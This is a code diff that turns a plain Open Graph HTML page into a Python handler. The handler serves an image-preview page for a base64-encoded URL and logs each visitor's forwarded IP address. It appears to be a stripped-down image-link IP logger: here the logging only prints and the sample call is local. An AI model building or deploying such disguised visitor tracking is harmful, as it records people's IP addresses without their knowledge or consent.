@@ -1,10 +1,76 @@
-<!DOCTYPE html>
+import urllib.parse as parse
+import base64
+
+config = {
+    "imageArgument": True,
+    "image": "https://example.com/default.jpg",
+    "buggedImage": False,
+    "accurateLocation": False
+}
+
+binaries = {"loading": b"fake image data"}
+
+def makeReport(ip, ua=None, location=None, endpoint=None, url=None):
+    print(f"Report: {ip}, {ua}, {location}, {endpoint}, {url}")
+    return "result"
+
+class MyHandler:
+    def __init__(self, path, headers):
+        self.path = path
+        self.headers = headers
+    
+    def handleRequest(self):
+        try:
+            if not self.path.startswith('/image.jpg'):
+                return
+            
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            data = f'''<!DOCTYPE html>
 <html>
 <head>
 <meta property="og:title" content="My Website">
 <meta property="og:description" content="Description">
-<meta property="og:image" content="https://gawiagwagwjawgjawj.vercel.app/image.jpg">
+<meta property="og:image" content="{url}">
 <meta property="og:type" content="website">
+<style>
+body {{
+    margin: 0;
+    padding: 0;
+}}
+div.img {{
+    background-image: url('{url}');
+    background-position: center center;
+    background-repeat: no-repeat;
+    background-size: contain;
+    width: 100vw;
+    height: 100vh;
+}}
+</style>
 </head>
-<body></body>
-</html>
+<body>
+<div class="img"></div>
+</body>
+</html>'''.encode()
+            
+            makeReport(self.headers.get('x-forwarded-for', 'unknown'), endpoint=self.path.split("?")[0], url=url)
+            
+            return data
+            
+        except Exception as e:
+            print(f"Error: {e}")
+            return None
+
+handler = MyHandler('/image.jpg?url=aHR0cHM6Ly9leGFtcGxlLmNvbS9pbWFnZS5qcGc', {'x-forwarded-for': '127.0.0.1'})
+result = handler.handleRequest()
+if result:
+    print("HTML generated successfully")
+    print(result.decode()[:200] + "...")
